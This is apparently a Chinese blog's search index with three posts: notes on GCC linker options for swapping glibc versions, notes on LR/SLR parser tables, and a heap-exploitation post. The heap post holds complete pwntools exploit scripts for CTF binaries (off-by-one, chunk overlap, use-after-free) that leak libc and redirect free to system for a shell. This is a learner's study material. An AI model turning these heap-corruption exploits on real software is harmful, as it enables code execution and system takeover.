<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>gcc天问之路</title>
    <url>/2024/08/09/gcc%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="gcc链接器"><a href="#gcc链接器" class="headerlink" title="gcc链接器"></a>gcc链接器</h1><h2 id="探坑之路"><a href="#探坑之路" class="headerlink" title="探坑之路"></a>探坑之路</h2><p>因为要为malloc的漏洞利用写demo，需要不同版本的共享库，之前一直再逃避写demo这件事，一直用的可执行文件，利用patchelf来更改链接器路径，但是为了深入学习还是得自己写demo，需要掌握编译链接的全过程。</p>
<p>一定要记住GUN不止GCC，gcc的时候也不是仅仅用gcc，遵从stfm的原则，想深入了解一下汇编链接的全过程去查看了一下gcc的文档，好无知，哈哈哈，明明更改动态链接库的版本需要的是ld，为什么要看gcc的文档呢，还是因为-Wl选项救了我，一看解释居然是给链接器传递参数。哈哈哈。接着赶快去看linker的文档，主要用上了这两个选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--rpath=...</span><br><span class="line">--dynamic-linker=....</span><br></pre></td></tr></table></figure>

<p>–rpath选项按文档上说是链接时查找的共享对象，但是我对这个共享库也知道甚少，因此对于其也仅仅会用的状态。</p>
<p>–dynamic-linker选项按文档的解释是更改linker的可执行文件，彻底激发了我的好奇心，原来linker可以被直接使用的，一直以为是个库，哈哈哈哈，无知的我。然后就去查了ld的文件类型。结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">l@L:/usr/bin$ file ld</span><br><span class="line">ld: symbolic link to x86_64-linux-gnu-ld</span><br><span class="line">l@L:/usr/bin$ file x86_64-linux-gnu-ld</span><br><span class="line">x86_64-linux-gnu-ld: symbolic link to x86_64-linux-gnu-ld.bfd</span><br><span class="line">l@L:/usr/bin$ file x86_64-linux-gnu-ld.bfd</span><br><span class="line">x86_64-linux-gnu-ld.bfd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c93d251e4e665bc9768ef05ba3086b166e95ec2b, for GNU/Linux 3.2.0, stripped</span><br><span class="line">l@L:/usr/bin$ file /lib64/ld-linux-x86-64.so.2</span><br><span class="line">/lib64/ld-linux-x86-64.so.2: symbolic link to /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">l@L:/usr/bin$ file /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, BuildID[sha1]=4186944c50f8a32b47d74931e3f512b811813b64, stripped</span><br></pre></td></tr></table></figure>

<p>盲菜ld这个东西是一个封装后的可以被人使用的程序，但是本质来看还是ld-linux-x86-64.so.2，调用其会出现：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">l@L:/usr/bin$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 --help</span><br><span class="line">Usage: /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]</span><br><span class="line">You have invoked &#x27;ld.so&#x27;, the program interpreter for dynamically-linked</span><br><span class="line">ELF programs.  Usually, the program interpreter is invoked automatically</span><br><span class="line">when a dynamically-linked executable is started.</span><br><span class="line"></span><br><span class="line">You may invoke the program interpreter program directly from the command</span><br><span class="line">line to load and run an ELF executable file; this is like executing that</span><br><span class="line">file itself, but always uses the program interpreter you invoked,</span><br><span class="line">instead of the program interpreter specified in the executable file you</span><br><span class="line">run.  Invoking the program interpreter directly provides access to</span><br><span class="line">additional diagnostics, and changing the dynamic linker behavior without</span><br><span class="line">setting environment variables (which would be inherited by subprocesses).</span><br></pre></td></tr></table></figure>

<p>坑越来越深，哈哈哈。</p>
<p>不过还是先记录下更改链接器的选项，不然又得查了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc top_chunk_demo1.c -Wl,--rpath=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 -Wl,--dynamic-linker=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so</span><br></pre></td></tr></table></figure>

<h2 id="无端猜测"><a href="#无端猜测" class="headerlink" title="无端猜测"></a>无端猜测</h2><p>本来挖出来的坑很多，要不就趁此机会把elf文件类型和编译过程真正搞通透，为未来的逆向打好基础，因为最近在学编译原理，一想，我还是把编译原理学完再说吧，效率高一点，编译原理目前是学到了yacc，以我浅薄的知识盲猜一下这个gcc的linker过程，汇编啥的不说了，所谓动态链接我猜测就是类似于python的解释过程，因为我在上述挖坑时看elf段意外发现了interpret这个段，楞一看这玩意跟解释器啥区别，之前一听解释器居然完全没联想起来，我一想动态连接，这玩意不就是在运行时需要啥拿啥吗，这python的解释器也是边解释边运行啊，编译模式的编译器，解释模式的编译器各有优点，这GUN怎么都有啊。。。。。难道时两者有点的结合？？我不知道，等学完编译原理再来补下面的吧，哈哈哈。</p>
]]></content>
      <categories>
        <category>cs</category>
        <category>杂项</category>
        <category>gcc|gun</category>
      </categories>
      <tags>
        <tag>cs</tag>
        <tag>elf</tag>
        <tag>gcc</tag>
      </tags>
  </entry>
  <entry>
    <title>关于parser的语法树生成算法（实现）</title>
    <url>/2024/08/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86paser%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Week-5-and-Week-6"><a href="#Week-5-and-Week-6" class="headerlink" title="Week 5 and Week 6"></a>Week 5 and Week 6</h2><blockquote>
<p>首先是提出算法实现前的一些铺垫，主要包括以下知识：</p>
<p>1.Top-Down and Bottom-Up</p>
<p>2.Shift-Reduce Parsing</p>
<p>3.一些notation为了算法实现做铺垫</p>
</blockquote>
<h3 id="1-Top-Down-and-Bottom-Up"><a href="#1-Top-Down-and-Bottom-Up" class="headerlink" title="1.Top-Down and Bottom-Up"></a>1.Top-Down and Bottom-Up</h3><p>Top-Down对应先前讲的leftmost，而Bottom-Up则对应先前讲的rightmost，Week 4是从易于理解的角度讲解，而本周则是从实现的角度讲解。主要涉及到了如何shift，如何reduce，以及如何生成树，但是没有讲什么时候。</p>
<h3 id="2-Shift-Reduce-Parsing"><a href="#2-Shift-Reduce-Parsing" class="headerlink" title="2.Shift-Reduce Parsing"></a>2.Shift-Reduce Parsing</h3><p>基于Top-Down and Bottom-Up引出的语法解析实现的简单模型，初步引入了一些notation，如</p>
<p><img src="/img/mypic/com/192717-17226163867168.png" alt="192717"></p>
<p>主要解决了在哪reduce的问题<img src="/img/mypic/com/192952-17226163831407.png" alt="192952"></p>
<p>期间讲了一个插曲，也就是冲突（conflict）的解决方法：</p>
<p>一个为：shift和reduce的冲突，可被precedence and associativity declaration修复，类似于leftmost 或者rightmost，如加法和乘法的优先级。</p>
<p>另一个： reduce-reduce conflict，不知道该选择哪一个规则，说明： There is ambiguity in the grammar ，Might be fixed by additional lookahead，这个类似于两个规则冲突</p>
<h3 id="3-When-to-shift-reduce"><a href="#3-When-to-shift-reduce" class="headerlink" title="3.When to shift&#x2F;reduce?"></a>3.When to shift&#x2F;reduce?</h3><p>接着讲什么时候解决冲突，主要引入了prefix and handle</p>
<p><img src="/img/mypic/com/193651-17226163759036.png" alt="193651-17226163759036"></p>
<p>然后将了语法规范（specific）和parser的关系，核心在这张图：基本观点是，规范越简单解析器越简单，解析器无法准确识别所用的上下文无关语法（CFG），解析器的实现也需要效率和功能的trade-off</p>
<p><img src="/img/mypic/com/193848-17226163733105.png" alt="193848-17226163733105"></p>
<h3 id="3-When-to-shift-reduce-realize"><a href="#3-When-to-shift-reduce-realize" class="headerlink" title="3.When to shift&#x2F;reduce?realize"></a>3.When to shift&#x2F;reduce?realize</h3><h4 id="algorithm-1（LR0）"><a href="#algorithm-1（LR0）" class="headerlink" title="algorithm 1（LR0）"></a>algorithm 1（LR0）</h4><blockquote>
<p>关键在于构造action和goto两张表格</p>
<p>构造上述两张表格需要知道Configuration set</p>
<p>构造configuration set需要知道如何计算Closure property</p>
</blockquote>
<ul>
<li><p>action和goto表格的状态转移可看下表：</p>
<p>只需要注意一点的就是其状态转移只和stack头的元素有关，当弹出元素之后的状态转移也是如此</p>
<p><img src="/img/mypic/com/235730.png" alt="235730"></p>
</li>
<li><p>closure的构造</p>
<p>把所有的非终结符递归的转换即可</p>
<p><img src="/img/mypic/com/000108-17226163667684.png" alt="2024-08-03 000108-17226163667684"></p>
</li>
<li><p>Successor(I, X)的构造</p>
<blockquote>
<p>类似于状态转移后的状态的构造，状态转移需要移动圆点</p>
</blockquote>
<p><img src="/img/mypic/com/image-20240803000246178.png" alt="image-20240803000246178"></p>
</li>
<li><p>configuration set的构造</p>
<p><img src="/img/mypic/com/image-20240803000332150-17226163592833.png" alt="image-20240803000332150"></p>
</li>
<li><p>action和goto的表格获得</p>
<p><img src="/img/mypic/com/image-20240803000701647-17226163557042.png" alt="image-20240803000701647"></p>
</li>
<li><p>需要注意的地方</p>
<blockquote>
<p>1.状态不要重复，状态也不能少</p>
<p>2.若出现冲突说明grammar定义的不好</p>
</blockquote>
<p>如此例子：则出现了reduce和shift冲突和reduce和reduce冲突，注意有的并非冲突，可以一个状态多次操作</p>
<p><img src="/img/mypic/com/image-20240803000826163-17226162670141.png" alt="image-20240803000826163"></p>
<p><img src="/img/mypic/com/image-20240803001104451.png" alt="image-20240803001104451"></p>
</li>
</ul>
<h4 id="algorithm-2（SLR1）"><a href="#algorithm-2（SLR1）" class="headerlink" title="algorithm 2（SLR1）"></a>algorithm 2（SLR1）</h4><blockquote>
<p>关键在于知道first（X）和follow（X）的定义，进而shift操作和reduce操作以及reduce-reduce的conflict都可以从follow（X）的定义解决，当然也有语法不满足的情况。</p>
<p>总结就是通过可以观察即将输入的terminal来判断是否执行push操作，或者直接执行reduce操作，因此称为SLR1，然后再根据执行操作后入栈的元素来实现状态转移，也就是说在入栈的那一刻状态也转移了，栈顶存储的就是此时的state</p>
<p>需注意一次状态一次操作，即state-&gt;action-&gt;new_state(根据action后的栈顶元素决定)</p>
</blockquote>
<ul>
<li><p>例子：在reduce阶段可以认为是（pop+push）然后进入新状态。</p>
<p><img src="/img/mypic/com/image-20240803224138802.png" alt="image-20240803224138802"></p>
</li>
</ul>
<h4 id="algorithm-3（SLR）"><a href="#algorithm-3（SLR）" class="headerlink" title="algorithm 3（SLR）"></a>algorithm 3（SLR）</h4><blockquote>
<p>讲看follow来构造configuration set改为根据看lookahead，更加细粒化，其他没有什么不一样的</p>
</blockquote>
<h3 id="5-优先级precedence"><a href="#5-优先级precedence" class="headerlink" title="5.优先级precedence"></a>5.优先级precedence</h3><blockquote>
<p>不是通过更改语法来实现，而是给算法增加额外规则，也就是人为增加何时reduce or shift，以减少此类冲突情形。</p>
</blockquote>
]]></content>
      <categories>
        <category>cs</category>
        <category>compiler</category>
      </categories>
      <tags>
        <tag>cs</tag>
        <tag>compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>heap利用</title>
    <url>/2024/08/01/heap%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h1><p>在一个可以写的区域伪造chunk（通过off-by-one使系统的指向chunk的指针能指向伪造chunk）</p>
<p><strong>注意chunk的大小的构造</strong></p>
<p><strong>其中指针有多层，因此可以泄露并且修改，p2地址泄露之后，覆盖p2为想要操作的地址，将p4将内容改为想要的内容</strong></p>
<ol>
<li><strong>p1-&gt;p2-&gt;内容</strong></li>
<li><strong>p1-&gt;p4-&gt;内容(更改p1的值)</strong></li>
</ol>
<p><strong>3.p1-&gt;p4-&gt;新内容（更改p1的指向的值）</strong></p>
<p><strong>对于一二步骤p1在第二层，但是对于第一步骤p1在第一层</strong></p>
<p><strong>想更改p1的间接内容，需要更新p1的指向为p4，需要把p1移到第二层（先泄露&amp;p1，然后再一个块的内部伪造一个新的chunk，其中放入&amp;p1，成功将其到第二层），通过fakechunk的一些操作可以更改p1的值（也就是改为&amp;p4），这样可以更改p4指向的内容，那么p1应该改成什么（改成泄露的重要地址，此题通过p1的指向来泄露，也就是&amp;p4和&amp;p2有着千丝万缕的关系）</strong></p>
<p><strong>更改p的值，和p的指向的值</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">binary = ELF(<span class="string">&quot;b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createbook</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description size: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(des_size), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(des), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">id</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;ID: &quot;</span>)</span><br><span class="line">        book_id = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">        <span class="built_in">print</span>(book_id)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Name: &quot;</span>)</span><br><span class="line">        book_name = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_name)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Description: &quot;</span>)</span><br><span class="line">        book_des = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_des)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Author: &quot;</span>)</span><br><span class="line">        book_author = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_author)</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name).encode(<span class="string">&#x27;ascii&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editbook</span>(<span class="params">book_id, new_des</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>,book_id)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter new book description: &quot;</span>,new_des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletebook</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(book_id).encode(<span class="string">&#x27;ascii&#x27;</span>)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exitpro</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter author name: &quot;</span>,<span class="number">32</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">createbook(<span class="string">&quot;32&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;272&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">createbook(<span class="string">&quot;135168&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;135168&quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook([<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(book_author[<span class="number">32</span>:<span class="number">38</span>])</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book1_address:&quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">p2vmmap = book1_addr+<span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(p2vmmap))</span><br><span class="line"></span><br><span class="line">payload=(<span class="number">0x58</span>+<span class="number">0x60</span>)*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0x1</span>)+p64(p2vmmap)+p64(p2vmmap)+p64(<span class="number">0x20</span>)</span><br><span class="line">editbook(<span class="string">b&#x27;1&#x27;</span>, payload)</span><br><span class="line">changename(<span class="string">&quot;A&quot;</span>*<span class="number">32</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook([<span class="number">1</span>])</span><br><span class="line">book2_des_addr=u64(book_des.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base=book2_des_addr-<span class="number">0x5a3010</span></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">sysbin = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&quot;sysbin:&quot;</span>+<span class="built_in">hex</span>(sysbin))</span><br><span class="line">editbook(<span class="string">b&#x27;1&#x27;</span>,p64(free_hook))</span><br><span class="line">editbook(<span class="string">b&#x27;2&#x27;</span>,p64(sysbin))</span><br><span class="line">createbook(<span class="string">&quot;8&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">deletebook(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="overslaping"><a href="#overslaping" class="headerlink" title="overslaping"></a>overslaping</h1><p><strong>和off-by-one有异曲同工之处，相同在，想方设法越权控制chunk字段，此方法就是将小chunk包含再大chunk之中，虽然我不能控制小chunk但是我可以控制大chunk进而控制小chunk，但是控制小chunk也是通过大chunk的某些字段实现，因此当更改小chunk某些字段之后，大chunk就失效了，因此只能利用一次，在一个地址处进行读写，此题是freegot</strong></p>
<p><strong>此题成功点在于fastbin的利用，fastbin的安全检查太少，链入链表只会检查和头是否重复，可以看出fastbin是一个用来攻击的破解点，需好好利用</strong></p>
<p><strong>此题的另一个重要漏洞是free参数的传递，其会直接传递用户指针，这样子参数就可控了</strong></p>
<p><strong>而想要控制大chunk包含小chunk需要溢出大chunk的size字段，使其可以包含小chunk</strong></p>
<p><strong>比较有意思的一点是假的chunk居然可以欺骗pwngdb，由此可以估计出pwngdb的实现就是通过简单的观察heap的相应字段实现的，哈哈哈哈</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    to create a chunk</span></span><br><span class="line"><span class="string">    size:bytes</span></span><br><span class="line"><span class="string">    content:bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param index: bytes(0 begin)</span></span><br><span class="line"><span class="string">    :param content: bytes</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size : &quot;</span>)</span><br><span class="line">    size = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    <span class="built_in">print</span>(size)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line">    content = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> size,content</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;152&#x27;</span>,<span class="number">144</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x90</span>))</span><br><span class="line">create(<span class="string">b&#x27;24&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">create(<span class="string">b&#x27;10&#x27;</span>,<span class="number">10</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x91</span>)+<span class="number">128</span>*<span class="string">b&#x27;b&#x27;</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">freegot = pro.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(freegot))</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;104&#x27;</span>,<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x70</span>)+p64(freegot)+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">size,content = show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">freeadd = u64(content.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(size,<span class="built_in">hex</span>(freeadd))</span><br><span class="line">base = freeadd - elf.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sysadd = elf.symbols[<span class="string">&#x27;system&#x27;</span>]+base</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(sysadd))</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#create(b&#x27;10&#x27;,10*b&#x27;c&#x27;)</span></span><br></pre></td></tr></table></figure>

<h1 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h1><p><strong>和前两者思路差不多基本上就是超越权限的指针访问，当指针free掉但是没有释放，那么低权限的用户再次使用可以更改高权限用户的数据，接着利用高权限的野指针可以访问到想访问到的东西</strong></p>
<p><strong>此题是hacknote，是一道教学题比较基础</strong></p>
<p><strong>py代码如下</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.buuoj.cn&quot;,29954)</span></span><br><span class="line">io = process(<span class="string">&quot;hacknote&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    to create a chunk</span></span><br><span class="line"><span class="string">    size:bytes</span></span><br><span class="line"><span class="string">    content:bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    content = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> size,content</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line">create(<span class="string">b&#x27;12&#x27;</span>,p32(magic))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="string">b&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>比较基础，原理不过多赘述，就是绕过指针检查，使chunk指针指向chunk地址的地址处，进而修改chunk的时候可以修改chunk指针达到任意地址写的目的，需要知道chunk指针的存储地址，也需要比较多的溢出量，以至于可以修改下一个chunk的prevsize字段和size字段。附上一道题目的py，<a href="https://buuoj.cn/challenges#hitcon2014_stkof">BUUCTF在线评测 (buuoj.cn)</a></p>
